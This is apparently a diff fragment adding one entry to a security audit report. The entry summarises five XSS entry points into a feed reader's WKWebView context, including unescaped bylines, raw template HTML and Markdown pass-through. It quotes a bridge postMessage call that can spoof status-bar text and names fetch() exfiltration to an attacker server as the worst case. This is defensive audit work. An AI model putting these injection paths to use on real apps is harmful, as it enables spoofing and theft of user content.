+      "narrative": "Five independent XSS entry points all deliver attacker JavaScript into the same WKWebView execution context. Finding 3 (unescaped author names/emails in byline HTML) and finding 30 (raw [[body]] HTML in templates) are reachable by any feed operator; finding 23 (footnote innerHTML) executes on link click; finding 57 (Markdown CommonMark HTML pass-through) requires source:markdown namespace usage; all four require only that the user views the article. Finding 48 confirms a concrete bridge action accessible from this context: any script can call window.webkit.messageHandlers.mouseDidEnter.postMessage(arbitraryString) to display misleading text in the macOS status bar. The full scope of bridge handlers — whether any expose account operations, file I/O, or keychain access — is unknown from the snapshot; the worst-case impact is exfiltration of all rendered article content via fetch() to an attacker server. WKWebView renderer-process isolation prevents escalation to native OS code execution, bounding this chain below the deep-link chain in severity."
+    }
+  ]
+}
+```
